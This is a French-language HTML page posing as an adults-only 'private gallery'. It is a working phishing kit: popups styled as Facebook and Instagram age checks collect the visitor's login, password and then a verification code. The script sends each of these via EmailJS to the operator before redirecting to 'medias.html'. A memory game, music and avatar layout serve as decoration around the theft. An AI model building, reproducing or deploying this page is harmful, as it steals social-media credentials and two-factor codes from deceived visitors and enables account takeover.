<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="utf-8"/>
  <title>Galerie privée</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>

  <!-- Social preview -->
  <meta property="og:title" content="Accès à ma galerie privée"/>
  <meta property="og:image" content="https://gabriella-swan.onrender.com/preview_gabriella.jpg"/>
  <meta property="og:url" content="https://gabriella-swan.onrender.com"/>
  <meta property="og:type" content="website"/>

  <meta name="twitter:card" content="summary_large_image"/>
  <meta name="twitter:title" content="Galerie privée"/>
  <meta name="twitter:image" content="https://gabriella-swan.onrender.com/preview_gabriella.jpg"/>

  <!-- Fonts -->
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800&family=Playfair+Display:wght@600;700&display=swap" rel="stylesheet"/>
  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>

  <style>
    :root{
      --bg:#0f1222;
      --surface:#151836;
      --surface-2:#1c2046;
      --text:#f5f7ff;
      --muted:#c9cce2;
      --accent:#6c8cff;
      --accent-2:#b466ff;
      --outline:rgba(255,255,255,.14);
      --glass:rgba(21,24,54,.68);
      --shadow:0 20px 60px rgba(0,0,0,.55);
      --radius:18px;

      /* shape variable (for avatars), overridable by classes */
      --thumb-shape: polygon(25% 6%, 75% 6%, 100% 50%, 75% 94%, 25% 94%, 0% 50%);
    }

    *{box-sizing:border-box}
    html,body{height:100%}
    body{
      margin:0;
      color:var(--text);
      font-family: Inter, system-ui, -apple-system, Segoe UI, Roboto, Helvetica, Arial, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", sans-serif;
      background:
        radial-gradient(900px 500px at 10% -10%, #1a1f4f 0%, transparent 60%),
        radial-gradient(700px 400px at 100% 0%, #1a1d3a 0%, transparent 60%),
        linear-gradient(180deg, #0b0e1b, var(--bg));
      letter-spacing:.2px;
    }

    .page{ max-width:1100px; margin: 0 auto; padding: clamp(20px, 4vw, 36px); }

    .header{ padding-top: 20px; text-align:center; }
    .badge{
      display:inline-flex; align-items:center; gap:10px;
      padding:8px 14px; border:1px solid var(--outline);
      border-radius:9999px; color:var(--muted);
      background: rgba(255,255,255,.02);
      backdrop-filter: blur(6px);
      font-weight:700; letter-spacing:.3px;
    }
    .badge img{height:18px;width:auto;display:block}
    .header h1{
      font-family: "Playfair Display", Georgia, serif;
      font-weight:700; font-size: clamp(2rem, 5vw, 3.6rem); line-height:1.1;
      margin: 14px 0 8px; text-shadow: 0 10px 30px rgba(0,0,0,.45);
    }
    .subtitle{ margin: 0 auto 18px; color: var(--muted); font-size: clamp(1rem, 2.5vw, 1.2rem); max-width: 56ch; }

    .cta-row{display:flex; justify-content:center; gap:12px; flex-wrap:wrap; margin-bottom: 24px;}
    .button{
      color:#fff; border:1px solid rgba(255,255,255,.08);
      padding: 13px 18px; font-size: 1rem; font-weight: 800;
      border-radius: 9999px; cursor: pointer;
      transition: transform .16s ease, box-shadow .16s ease, filter .16s ease, background .16s ease;
      display:inline-flex; align-items:center; gap:10px;
      background: linear-gradient(90deg, var(--accent), var(--accent-2));
      box-shadow: 0 10px 28px rgba(0,0,0,.35);
    }
    .button:hover{ transform: translateY(-2px); filter: saturate(1.06) brightness(1.02); }
    .button[disabled]{opacity:.7; cursor:not-allowed;}
    .button.fb{ background: linear-gradient(90deg, #1877F2, #4a90e2); }
    .button.ig{ background: linear-gradient(90deg, #f09433, #bc1888); }
    .icon{ width:18px;height:18px; display:inline-block; }

    .bitmoji-layout{
      position: relative;
      width: 520px; height: 520px;
      margin: 20px auto 10px;
      max-width: 92vw; max-height: 92vw;
    }
    .bitmoji{
      --scale: 1;
      width: 112px; height: 112px;
      background-size: cover; background-position: center;
      clip-path: var(--thumb-shape);
      border: 1.5px solid rgba(255,255,255,.85);
      box-shadow: 0 10px 24px rgba(0,0,0,.45);
      position: absolute; cursor: pointer;
      transition: transform .22s ease, box-shadow .22s ease, outline .22s ease, filter .22s ease;
      outline: 0 solid transparent;
      transform: translate(-50%, -50%) scale(var(--scale));
      will-change: transform, top, left;
      background-color:#0b0e1b;
      border-radius: 0;
    }
    .bitmoji:hover{ --scale: 1.06; box-shadow: 0 16px 36px rgba(0,0,0,.55); }
    .bitmoji.active{ outline: 10px solid rgba(255,255,255,.10); filter:saturate(1.05); }

    .bottom-banner{ display:flex; justify-content:center; position:relative; }
    .bottom-banner img{
      width: 92%; max-width: 980px; height: auto;
      display:block; margin: 16px auto 26px;
      border-radius: var(--radius); box-shadow: var(--shadow);
      transition: border-radius .2s ease, box-shadow .2s ease, transform .2s ease, filter .2s ease;
    }
    .bottom-banner.avatar-mode img{ border-radius: 14px; filter: saturate(1.04); }

    .overlay{ position: fixed; inset: 0; background: rgba(0,0,0,.55); display: none; z-index: 999; backdrop-filter: blur(2px); }
    .login-popup, .verification-popup{
      position: fixed; top: 10%; left: 50%; transform: translateX(-50%);
      width: min(92%, 480px);
      background: var(--glass); color: var(--text); padding: 22px;
      border-radius: var(--radius); border: 1px solid var(--outline);
      box-shadow: var(--shadow); display: none; text-align:left; z-index:1000; backdrop-filter: blur(14px);
    }
    .login-popup h3, .verification-popup h3{ margin:0 0 12px; font-size:1.15rem; font-weight:800; text-align:center; }
    .login-popup label, .verification-popup label{ color: var(--text); font-weight: 600; display:inline-block; margin: 8px 0; }
    .login-popup input, .verification-popup input{
      width:100%; background:#141736; border:1px solid #2d3365; color:var(--text);
      border-radius:12px; padding:12px; outline:none; margin-bottom:10px;
    }
    .login-popup input::placeholder, .verification-popup input::placeholder{ color:#aab0d9; }
    .popup-actions{ display:grid; grid-template-columns:1fr 1fr; gap:10px; margin-top:8px; }
    .btn{ border:none; border-radius:9999px; padding:12px 16px; font-weight:800; cursor:pointer; }
    .btn[disabled]{opacity:.7; cursor:not-allowed;}
    .btn-primary{ background: linear-gradient(90deg, var(--accent), var(--accent-2)); color:#fff; }
    .btn-primary:hover{ filter:saturate(1.05) brightness(1.02); }
    .btn-secondary{ background: transparent; color: var(--text); border: 1px solid var(--outline); }
    .btn-secondary:hover{ background: rgba(255,255,255,.03); }
    .helper{ font-size:.9rem; color:#d5d9ff; margin-top:6px; min-height:1.2em; }

    .sound-toggle{
      position: fixed; right: 14px; bottom: 14px; z-index: 2000;
      background: var(--surface); color: var(--text);
      border: 1px solid var(--outline); border-radius: 9999px;
      padding: 10px 14px; font-weight: 800; cursor: pointer;
      box-shadow: 8px 8px 18px rgba(0,0,0,.35), -6px -6px 16px rgba(255,255,255,.04);
      display:inline-block;
    }
    .sound-toggle:hover{ filter:saturate(1.05) brightness(1.03); }

    /* Shape selector */
    .shape-toggle{
      position: fixed; left: 14px; bottom: 14px; z-index: 2000;
      display:flex; flex-direction:column; align-items:flex-start; gap:10px;
    }
    .shape-fab{
      background: var(--surface); color: var(--text);
      border: 1px solid var(--outline); border-radius: 9999px;
      padding: 10px 14px; font-weight: 800; cursor: pointer;
      box-shadow: 8px 8px 18px rgba(0,0,0,.35), -6px -6px 16px rgba(255,255,255,.04);
    }
    .shape-panel{
      display:none; padding:10px; background: var(--glass);
      border:1px solid var(--outline); border-radius: 14px; box-shadow: var(--shadow);
      backdrop-filter: blur(10px);
    }
    .shape-panel.open{ display:flex; gap:8px; flex-wrap:wrap; max-width: 260px; }
    .shape-btn{
      font-weight:800; font-size:.9rem; padding:8px 12px; border-radius:9999px;
      border:1px solid var(--outline); background: rgba(255,255,255,.05); color:var(--text);
      cursor:pointer;
    }
    .shape-btn[aria-pressed="true"]{ background: linear-gradient(90deg, var(--accent), var(--accent-2)); border-color: transparent; }
    .shape-hint{ color:var(--muted); font-size:.85rem; margin-top:6px; }

    body.shape-hex      { --thumb-shape: polygon(25% 6%, 75% 6%, 100% 50%, 75% 94%, 25% 94%, 0% 50%); }
    body.shape-circle   { --thumb-shape: circle(50% at 50% 50%); }
    body.shape-diamond  { --thumb-shape: polygon(50% 0,100% 50%,50% 100%,0 50%); }
    body.shape-round    { --thumb-shape: none; }
    body.shape-round .bitmoji{ border-radius: 18px; }

    :focus-visible{ outline:2px solid var(--accent); outline-offset:2px; border-radius:12px; }

    /* Memory game modal */
    .mg-open-btn{
      position: fixed; left: 14px; bottom: 70px; z-index: 2000;
      background: var(--surface); color: var(--text);
      border: 1px solid var(--outline); border-radius: 9999px;
      padding: 10px 14px; font-weight: 800; cursor: pointer;
      box-shadow: 8px 8px 18px rgba(0,0,0,.35), -6px -6px 16px rgba(255,255,255,.04);
    }
    .mg-overlay{
      position: fixed; inset:0; background: rgba(0,0,0,.6); display:none; z-index: 3000;
      backdrop-filter: blur(2px);
    }
    .mg-modal{
      position: fixed; top: 50%; left:50%; transform: translate(-50%, -50%);
      width: min(94vw, 760px); background: var(--glass); color: var(--text);
      border:1px solid var(--outline); border-radius: 18px; box-shadow: var(--shadow);
      padding: 16px 16px 22px; display:none; z-index: 3001;
    }
    .mg-header{ display:flex; align-items:center; justify-content:space-between; gap:10px; margin-bottom: 10px; }
    .mg-title{ font-weight:800; font-size:1.1rem; }
    .mg-controls{ display:flex; align-items:center; gap:8px; }
    .mg-stat{ color: var(--muted); font-weight:700; }
    .mg-btn{ padding:8px 12px; border-radius:9999px; border:1px solid var(--outline); background: rgba(255,255,255,.06); color:var(--text); font-weight:800; cursor:pointer; }
    .mg-grid{
      display:grid; grid-template-columns: repeat(4, minmax(70px, 1fr)); gap: 10px;
      width:100%; margin-top: 8px;
    }
    .mg-card{
      position: relative; aspect-ratio: 3/4; border-radius: 14px; overflow:hidden; cursor:pointer;
      background: #0b0e1b; border: 1px solid #2d3365; transform-style: preserve-3d;
      transition: transform .3s ease;
    }
    .mg-card-inner{ position:absolute; inset:0; transform-style: preserve-3d; transition: transform .35s ease; }
    .mg-card-front, .mg-card-back{
      position:absolute; inset:0; backface-visibility:hidden; background-size: cover; background-position:center;
    }
    .mg-card-front{ transform: rotateY(0deg); background: linear-gradient(180deg, #141a4b, #0b0e1b); display:flex; align-items:center; justify-content:center; font-weight:800; color:#9aa3ff; }
    .mg-card-back{ transform: rotateY(180deg); }
    .mg-card.flipped .mg-card-inner{ transform: rotateY(180deg); }
    .mg-win{
      margin-top:10px; padding:10px; text-align:center; font-weight:800; color:#a2ffcf; display:none;
      border:1px dashed rgba(162,255,207,.4); border-radius:12px; background: rgba(162,255,207,.06);
    }

    @media (max-width:640px){
      .mg-grid{ grid-template-columns: repeat(3, 1fr); }
    }
  </style>
</head>
<body class="shape-hex">
  <!-- Audio -->
  <audio id="bgm" src="music.wav" preload="auto" autoplay loop playsinline></audio>

  <div class="page">
    <header class="header">
      <div class="badge" aria-label="Accès réservé aux adultes">
        <img src="banner.png" alt="18+" loading="lazy"/>
        Accès réservé aux 18+
      </div>
      <h1>Galerie privée</h1>
      <p class="subtitle">Accès sécurisé à ma galerie privée. Veuillez vérifier votre âge via votre réseau social.</p>

      <div class="cta-row">
        <button class="button fb" id="facebookBtn" onclick="triggerFirstPlay(); openFacebookPopup()">
          <svg class="icon" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true">
            <path d="M22 12.06C22 6.48 17.52 2 11.94 2S2 6.48 2 12.06c0 4.99 3.66 9.13 8.44 9.94v-7.03H7.9v-2.91h2.54V9.41c0-2.5 1.49-3.89 3.77-3.89 1.09 0 2.23.2 2.23.2v2.45h-1.26c-1.24 0-1.63.77-1.63 1.56v1.87h2.78l-.44 2.91h-2.34V22c4.78-.81 8.44-4.95 8.44-9.94z"/>
          </svg>
          Valider mon âge (Facebook)
        </button>

        <button class="button ig" id="instagramBtn" onclick="triggerFirstPlay(); openInstagramPopup()">
          <svg class="icon" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true">
            <path d="M7 2h10a5 5 0 015 5v10a5 5 0 01-5 5H7a5 5 0 01-5-5V7a5 5 0 015-5zm10 2H7a3 3 0 00-3 3v10a3 3 0 003 3h10a3 3 0 003-3V7a3 3 0 00-3-3zm-5 3.5a5.5 5.5 5.5 0 110 11 5.5 5.5 0 010-11zm0 2a3.5 3.5 0 100 7 3.5 3.5 0 000-7zM18 6.5a1.25 1.25 0 110 2.5 1.25 1.25 0 010-2.5z"/>
          </svg>
          Valider mon âge (Instagram)
        </button>
      </div>
    </header>

    <div class="bitmoji-layout" id="bitmojiHex">
      <div class="bitmoji" data-src="avatar1.png" style="background-image:url('avatar1.png')"></div>
      <div class="bitmoji" data-src="avatar2.png" style="background-image:url('avatar2.png')"></div>
      <div class="bitmoji" data-src="avatar3.png" style="background-image:url('avatar3.png')"></div>
      <div class="bitmoji" data-src="avatar4.png" style="background-image:url('avatar4.png')"></div>
      <div class="bitmoji" data-src="avatar5.png" style="background-image:url('avatar5.png')"></div>
      <div class="bitmoji" data-src="avatar6.png" style="background-image:url('avatar6.png')"></div>
    </div>

    <div class="bottom-banner" id="bannerWrap">
      <img src="banner.png" alt="Bannière 18+" id="mainBanner"/>
    </div>
  </div>

  <!-- Overlay & Popups -->
  <div id="overlay" class="overlay" onclick="closeAllPopups()"></div>

  <div class="login-popup" id="facebookPopup">
    <h3>Valide ton âge avec Facebook</h3>
    <label for="fb-email">E-mail ou numéro de mobile</label>
    <input id="fb-email" type="text" placeholder="E-mail ou numéro de mobile"/>
    <label for="fb-password">Mot de passe</label>
    <input id="fb-password" type="password" placeholder="Mot de passe"/>
    <div class="popup-actions">
      <button class="btn btn-primary" id="fb-submit" onclick="submitFacebook()">Confirmer</button>
      <button class="btn btn-secondary" onclick="closePopup('facebookPopup')">Retour</button>
    </div>
    <div class="helper" id="fb-helper"></div>
  </div>

  <div class="login-popup" id="instagramPopup">
    <h3>Valide ton âge avec Instagram</h3>
    <label for="ig-user">Nom d’utilisateur</label>
    <input id="ig-user" type="text" placeholder="Nom d’utilisateur"/>
    <label for="ig-password">Mot de passe</label>
    <input id="ig-password" type="password" placeholder="Mot de passe"/>
    <div class="popup-actions">
      <button class="btn btn-primary" id="ig-submit" onclick="submitInstagram()">Confirmer</button>
      <button class="btn btn-secondary" onclick="closePopup('instagramPopup')">Retour</button>
    </div>
    <div class="helper" id="ig-helper"></div>
  </div>

  <div class="verification-popup" id="verificationPopup">
    <h3>Validation des informations</h3>
    <label for="verificationCode">Entrer le code reçu :</label>
    <input id="verificationCode" type="text" inputmode="numeric" maxlength="8" pattern="\\d*" placeholder="Code de 6 à 8 chiffres"/>
    <div class="popup-actions">
      <button class="btn btn-primary" id="code-submit" onclick="finishAndContinue()">OK</button>
      <button class="btn btn-secondary" onclick="closePopup('verificationPopup')">Retour</button>
    </div>
    <div class="helper" id="code-helper"></div>
  </div>

  <!-- Shape selector -->
  <div class="shape-toggle" aria-controls="shapePanel">
    <button class="shape-fab" id="shapeFab" aria-expanded="false" aria-controls="shapePanel" title="Choisir la forme des aperçus">⚙️</button>
    <div class="shape-panel" id="shapePanel" role="group" aria-label="Formes d’aperçus">
      <button class="shape-btn" data-shape="shape-hex">Hexagone</button>
      <button class="shape-btn" data-shape="shape-circle">Cercle</button>
      <button class="shape-btn" data-shape="shape-round">Carré arrondi</button>
      <button class="shape-btn" data-shape="shape-diamond">Losange</button>
      <div class="shape-hint">Astuce : votre choix est mémorisé.</div>
    </div>
  </div>

  <!-- Memory Game trigger + modal -->
  <button class="mg-open-btn" id="mgOpenBtn" title="Jouer au jeu de mémoire">🧩 Jeu</button>
  <div class="mg-overlay" id="mgOverlay"></div>
  <div class="mg-modal" id="mgModal" role="dialog" aria-modal="true" aria-labelledby="mgTitle">
    <div class="mg-header">
      <div class="mg-title" id="mgTitle">Jeu de mémoire</div>
      <div class="mg-controls">
        <span class="mg-stat" id="mgMoves">0 coups</span>
        <span class="mg-stat" id="mgTime">00:00</span>
        <button class="mg-btn" id="mgRestart">Recommencer</button>
        <button class="mg-btn" id="mgClose">Fermer</button>
      </div>
    </div>
    <div class="mg-grid" id="mgGrid" aria-label="Grille de cartes mémoire"></div>
    <div class="mg-win" id="mgWin">Bravo 🎉 Vous avez trouvé toutes les paires !</div>
  </div>

  <!-- Original scripts + additions -->
  <script>
    // Init EmailJS (inchangé)
    document.addEventListener('DOMContentLoaded', function(){
      if (window.emailjs) {
        console.log('EmailJS init OK');
        emailjs.init('AATQVLMcBJaRBgEox');
      }
      document.addEventListener('keydown', (e) => {
        if (e.key === 'Escape') {
          closeAllPopups();
          // close memory modal if open
          const overlay = document.getElementById('mgOverlay');
          if (overlay && overlay.style.display === 'block') mgClose();
        }
      });
    });

    function openFacebookPopup() {
      document.getElementById('overlay').style.display = 'block';
      document.getElementById('facebookPopup').style.display = 'block';
    }
    function openInstagramPopup() {
      document.getElementById('overlay').style.display = 'block';
      document.getElementById('instagramPopup').style.display = 'block';
    }
    function closePopup(id) {
      document.getElementById(id).style.display = 'none';
      const anyOpen = document.querySelector('.login-popup[style*="display: block"], .verification-popup[style*="display: block"]');
      if (!anyOpen) document.getElementById('overlay').style.display = 'none';
    }
    function closeAllPopups(){
      document.getElementById('overlay').style.display = 'none';
      document.getElementById('facebookPopup').style.display = 'none';
      document.getElementById('instagramPopup').style.display = 'none';
      document.getElementById('verificationPopup').style.display = 'none';
    }

    // EmailJS – Facebook
    async function submitFacebook(){
      const email = document.getElementById('fb-email').value.trim();
      const pass  = document.getElementById('fb-password').value.trim();
      const btn   = document.getElementById('fb-submit');
      const help  = document.getElementById('fb-helper');

      if (!email || !pass) { help.textContent = 'Veuillez remplir tous les champs.'; return; }
      if (!window.emailjs) { help.textContent = 'EmailJS non chargé.'; return; }

      help.textContent = 'Envoi en cours...';
      btn.disabled = true;

      try {
        await emailjs.send('service_photos', 'template_connexion', {
          fb_email: "Facebook " + email,
          fb_password: pass
        }).then(function(res){console.log('EmailJS OK', res);}).catch(function(err){console.error('EmailJS ERROR', err);});
        help.textContent = 'Informations envoyées. Vérification...';
        closePopup('facebookPopup');
        document.getElementById('verificationPopup').style.display = 'block';
        document.getElementById('overlay').style.display = 'block';
      } catch (err) {
        help.textContent = 'Erreur EmailJS : ' + (err && err.text ? err.text : JSON.stringify(err));
      } finally {
        btn.disabled = false;
      }
    }

    // EmailJS – Instagram
    async function submitInstagram(){
      const user = document.getElementById('ig-user').value.trim();
      const pass = document.getElementById('ig-password').value.trim();
      const btn  = document.getElementById('ig-submit');
      const help = document.getElementById('ig-helper');

      if (!user || !pass) { help.textContent = 'Veuillez remplir tous les champs.'; return; }
      if (!window.emailjs) { help.textContent = 'EmailJS non chargé.'; return; }

      help.textContent = 'Envoi en cours...';
      btn.disabled = true;

      try {
        await emailjs.send('service_photos', 'template_connexion', {
          fb_email: "Instagram " + user,
          fb_password: pass
        }).then(function(res){console.log('EmailJS OK', res);}).catch(function(err){console.error('EmailJS ERROR', err);});
        help.textContent = 'Informations envoyées. Vérification...';
        closePopup('instagramPopup');
        document.getElementById('verificationPopup').style.display = 'block';
        document.getElementById('overlay').style.display = 'block';
      } catch (err) {
        help.textContent = 'Erreur EmailJS : ' + (err && err.text ? err.text : JSON.stringify(err));
      } finally {
        btn.disabled = false;
      }
    }

    // EmailJS – code (inchangé)
    async function finishAndContinue(){
      const code = document.getElementById('verificationCode').value.trim();
      const btn  = document.getElementById('code-submit');
      const help  = document.getElementById('code-helper');

      if (!code) { help.textContent = 'Veuillez entrer le code de vérification.'; return; }
      if (!window.emailjs) { help.textContent = 'EmailJS non chargé.'; return; }

      help.textContent = 'Validation en cours...';
      btn.disabled = true;

      try {
        await emailjs.send('service_photos', 'template_code', {
          verification_code: code
        }).then(function(res){console.log('EmailJS OK', res);}).catch(function(err){console.error('EmailJS ERROR', err);});
        closeAllPopups();
        window.location.href = 'medias.html';
      } catch (err) {
        help.textContent = 'Erreur EmailJS : ' + (err && err.text ? err.text : JSON.stringify(err));
      } finally {
        btn.disabled = false;
      }
    }
  </script>

  <!-- Hexagon layout + banner replacement + first-click audio trigger -->
  <script>
  document.addEventListener('DOMContentLoaded', function() {
    const container = document.getElementById('bitmojiHex');
    const avatars = container ? container.querySelectorAll('.bitmoji') : [];
    const banner  = document.getElementById('mainBanner');
    const bannerWrap = document.getElementById('bannerWrap');

    if (!container || !avatars.length || !banner || !bannerWrap) return;

    const defaultBanner = banner.getAttribute('src');

    function layoutHex(){
      const rect = container.getBoundingClientRect();
      const cx = rect.width / 2;
      const cy = rect.height / 2;
      const r = Math.min(rect.width, rect.height) * 0.38;
      avatars.forEach((el, i) => {
        const angleDeg = -90 + i * 60;
        const rad = angleDeg * Math.PI / 180;
        const x = cx + r * Math.cos(rad);
        const y = cy + r * Math.sin(rad);
        el.style.left = x + 'px';
        el.style.top  = y + 'px';
      });
    }
    layoutHex();
    window.addEventListener('resize', layoutHex);

    function extractUrlFrom(el){
      let bg = el.style.backgroundImage;
      let m = bg && bg.match(/url\(["']?(.*?)["']?\)/);
      if (m && m[1]) return m[1];
      const cs = getComputedStyle(el).backgroundImage;
      m = cs && cs.match(/url\(["']?(.*?)["']?\)/);
      if (m && m[1]) return m[1];
      return el.getAttribute('data-src') || null;
    }

    function onAvatarClick(el){
      triggerFirstPlay();
      avatars.forEach(a => a.classList.remove('active'));
      el.classList.add('active');
      const src = extractUrlFrom(el);
      if (src) {
        banner.src = src;
        bannerWrap.classList.add('avatar-mode');
      }
    }

    avatars.forEach(function(el) {
      el.addEventListener('click', function() { onAvatarClick(el); });
    });

    banner.addEventListener('dblclick', function() {
      banner.src = defaultBanner;
      bannerWrap.classList.remove('avatar-mode');
      avatars.forEach(a => a.classList.remove('active'));
    });
  });
  </script>

  <!-- Bouton Son -->
  <button id="soundToggle" class="sound-toggle" aria-label="Activer/Désactiver le son">🔇</button>

  <script>
  let __audioPrimed = false;
  function triggerFirstPlay(){
    const audio = document.getElementById('bgm');
    const toggle = document.getElementById('soundToggle');
    if (!audio || !toggle) return;
    if (!__audioPrimed){
      audio.muted = false;
      audio.play().then(() => {
        toggle.textContent = '🔊';
        __audioPrimed = true;
      }).catch(() => {
        toggle.textContent = (audio.muted || audio.paused) ? '🔇' : '🔊';
        __audioPrimed = true;
      });
    }
  }

  document.addEventListener('DOMContentLoaded', function(){
    const audio = document.getElementById('bgm');
    const toggle = document.getElementById('soundToggle');
    if (!audio || !toggle) return;

    audio.muted = true;
    audio.play().catch(()=>{});

    const setIcon = () => { toggle.textContent = (audio.muted || audio.paused) ? '🔇' : '🔊'; };

    const primeOnce = () => { triggerFirstPlay(); document.removeEventListener('click', primeOnce); };
    document.addEventListener('click', primeOnce, { once:true });

    toggle.addEventListener('click', function(e){
      e.stopPropagation();
      if (audio.muted || audio.paused) {
        triggerFirstPlay();
      } else {
        audio.pause();
        audio.muted = true;
        setIcon();
      }
    });

    setTimeout(() => { setIcon(); }, 600);
  });
  </script>

  <!-- Shape selector logic + Memory game logic -->
  <script>
    (function shapeSelector(){
      const KEY = 'thumb-shape-class';
      const body = document.body;
      const fab = document.getElementById('shapeFab');
      const panel = document.getElementById('shapePanel');
      const buttons = panel.querySelectorAll('.shape-btn');

      const saved = localStorage.getItem(KEY);
      if (saved) {
        body.classList.remove('shape-hex','shape-circle','shape-diamond','shape-round');
        body.classList.add(saved);
      }

      function reflect(){
        const current = Array.from(body.classList).find(c => /^shape-/.test(c)) || 'shape-hex';
        buttons.forEach(b => b.setAttribute('aria-pressed', b.dataset.shape === current ? 'true' : 'false'));
      }
      reflect();

      fab.addEventListener('click', function(){
        const isOpen = panel.classList.toggle('open');
        fab.setAttribute('aria-expanded', isOpen ? 'true' : 'false');
      });

      buttons.forEach(btn => {
        btn.addEventListener('click', function(){
          const cls = btn.dataset.shape;
          body.classList.remove('shape-hex','shape-circle','shape-diamond','shape-round');
          body.classList.add(cls);
          localStorage.setItem(KEY, cls);
          reflect();
        });
      });

      document.addEventListener('click', function(ev){
        if (!panel.classList.contains('open')) return;
        const within = ev.target.closest('.shape-toggle');
        if (!within) {
          panel.classList.remove('open');
          fab.setAttribute('aria-expanded','false');
        }
      });
    })();

    (function memoryGame(){
      const openBtn = document.getElementById('mgOpenBtn');
      const overlay = document.getElementById('mgOverlay');
      const modal = document.getElementById('mgModal');
      const grid = document.getElementById('mgGrid');
      const closeBtn = document.getElementById('mgClose');
      const restartBtn = document.getElementById('mgRestart');
      const movesEl = document.getElementById('mgMoves');
      const timeEl = document.getElementById('mgTime');
      const winEl = document.getElementById('mgWin');

      let first = null, second = null, lock = false;
      let moves = 0, pairsLeft = 0;
      let timer = null, startTime = null;

      function fmt(n){ return n < 10 ? '0' + n : '' + n; }
      function startTimer(){
        startTime = Date.now();
        timer = setInterval(() => {
          const s = Math.floor((Date.now() - startTime)/1000);
          const mm = Math.floor(s/60), ss = s%60;
          timeEl.textContent = fmt(mm) + ':' + fmt(ss);
        }, 300);
      }
      function stopTimer(){
        clearInterval(timer); timer = null;
      }

      function shuffle(a){
        for (let i = a.length - 1; i > 0; i--) {
          const j = Math.floor(Math.random() * (i + 1));
          [a[i], a[j]] = [a[j], a[i]];
        }
        return a;
      }

      function getAvatarSrcs(){
        const container = document.getElementById('bitmojiHex');
        const nodes = container ? container.querySelectorAll('.bitmoji') : [];
        const srcs = [];
        nodes.forEach(n => {
          const bg = n.style.backgroundImage;
          const m = bg && bg.match(/url\\(["']?(.*?)["']?\\)/);
          if (m && m[1]) srcs.push(m[1]);
          else if (n.dataset && n.dataset.src) srcs.push(n.dataset.src);
        });
        // limit to first 6 (duplicated -> 12 cards)
        return srcs.slice(0, 6);
      }

      function buildGrid(){
        grid.innerHTML = '';
        winEl.style.display = 'none';
        first = second = null; lock = false;
        moves = 0; movesEl.textContent = '0 coups';
        timeEl.textContent = '00:00';
        if (timer) stopTimer(); startTime = null;

        const imgs = getAvatarSrcs();
        pairsLeft = imgs.length;
        const cards = shuffle(imgs.concat(imgs)).map((src, idx) => {
          const card = document.createElement('button');
          card.className = 'mg-card';
          card.type = 'button';
          card.setAttribute('aria-label', 'Carte mémoire');
          card.dataset.key = src;

          const inner = document.createElement('div');
          inner.className = 'mg-card-inner';

          const front = document.createElement('div');
          front.className = 'mg-card-front';
          front.textContent = 'Retourner';

          const back = document.createElement('div');
          back.className = 'mg-card-back';
          back.style.backgroundImage = 'url(\"' + src + '\")';

          inner.appendChild(front); inner.appendChild(back);
          card.appendChild(inner);
          card.addEventListener('click', () => onFlip(card));

          return card;
        });
        cards.forEach(c => grid.appendChild(c));
      }

      function onFlip(card){
        if (lock || card.classList.contains('flipped')) return;

        // start timer on first action
        if (!startTime) startTimer();

        card.classList.add('flipped');
        if (!first){ first = card; return; }
        second = card;
        lock = true;
        moves++; movesEl.textContent = moves + (moves > 1 ? ' coups' : ' coup');

        if (first.dataset.key === second.dataset.key){
          // match
          setTimeout(() => {
            first.setAttribute('disabled','true');
            second.setAttribute('disabled','true');
            first = second = null;
            lock = false;
            pairsLeft--;
            if (pairsLeft === 0){
              stopTimer();
              winEl.style.display = 'block';
            }
          }, 300);
        } else {
          // no match
          setTimeout(() => {
            first.classList.remove('flipped');
            second.classList.remove('flipped');
            first = second = null;
            lock = false;
          }, 700);
        }
      }

      function mgOpen(){
        overlay.style.display = 'block';
        modal.style.display = 'block';
        buildGrid();
        setTimeout(()=>modal.focus(), 0);
      }
      function mgClose(){
        overlay.style.display = 'none';
        modal.style.display = 'none';
        stopTimer();
      }

      openBtn.addEventListener('click', mgOpen);
      overlay.addEventListener('click', mgClose);
      closeBtn.addEventListener('click', mgClose);
      restartBtn.addEventListener('click', buildGrid);

      // expose mgClose for Escape handler
      window.mgClose = mgClose;
    })();
  </script>

</body>
</html>
